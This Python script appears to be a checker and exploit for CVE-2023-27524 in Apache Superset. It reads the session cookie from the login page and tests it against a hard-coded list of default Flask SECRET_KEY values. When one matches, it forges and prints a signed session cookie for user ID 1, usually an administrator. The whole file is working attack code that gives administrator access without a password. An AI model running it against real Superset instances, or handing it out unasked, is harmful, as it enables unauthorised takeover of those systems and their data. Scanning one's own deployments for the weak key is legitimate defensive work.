from flask_unsign import session
import requests
import urllib3
import re
from time import sleep
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#List of secret keys used to forge session cookies
SECRET_KEYS = [
    b'\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h',  # version < 1.4.1
    b'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET',          # version >= 1.4.1
    b'thisISaSECRET_1234',                            # deployment template
    b'YOUR_OWN_RANDOM_GENERATED_SECRET_KEY',          # documentation
    b'TEST_NON_DEV_SECRET'                            # docker compose
]

#function to check apache superset is explotable
def check_exploit(url, user_id='1', validate=False, timeout=5):
    messages = []

    try:
        u = url.rstrip('/') + '/login/'

        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0'
        }
        #get request to the superset login page and extrct the session cookie
        resp = requests.get(u, headers=headers, verify=False, timeout=30, allow_redirects=False)
        if resp.status_code != 200:
            messages.append(f'Error retrieving login page at {u}, status code: {resp.status_code}')
            return False, messages
        #Store the session cookie
        session_cookie = None
        for c in resp.cookies:
            if c.name == 'session':
                session_cookie = c.value
                break

        if not session_cookie:
            messages.append('Error: No session cookie found')
            return False, messages

        messages.append(f'Got session cookie: {session_cookie}')
        #Check if its a flask session cookie
        try:
            decoded = session.decode(session_cookie)
            messages.append(f'Decoded session cookie: {decoded}')
        except:
            messages.append('Error: Not a Flask session cookie')
            return False, messages
        #get the superset version running
        match = re.search(r'&#34;version_string&#34;: &#34;(.*?)&#34', resp.text)
        if match:
            version = match.group(1)
        else:
            version = 'Unknown'

        messages.append(f'Superset Version: {version}')
        #use the list of secret cookies to crack the session
        for i, k in enumerate(SECRET_KEYS):
            cracked = session.verify(session_cookie, k)
            if cracked:
                break

        if not cracked:
            messages.append('Failed to crack session cookie')
            return False, messages

        messages.append(f'Vulnerable to CVE-2023-27524 - Using default SECRET_KEY: {k}')


        forged_cookie = session.sign({'_user_id': user_id, 'user_id': user_id}, k)
        messages.append(f'Forged session cookie for user {user_id}: {forged_cookie}')

        return True, messages

    except Exception as e:
        messages.append(f'Unexpected error: {e}')
        return False, messages


if __name__ == '__main__':
    url = input("Enter the base URL of Superset instance or IP:Port of the instance: ")
    #append http:// if user passes ip:host
    if not url.startswith("http://"):
       url = "http://"+ url
    #Call function to check if superset is exploitable
    exploitable, messages = check_exploit(url)
    for message in messages:
        print(message)
    if exploitable:
        print("System is exploitable!")
    else:
        print("System is not exploitable.")
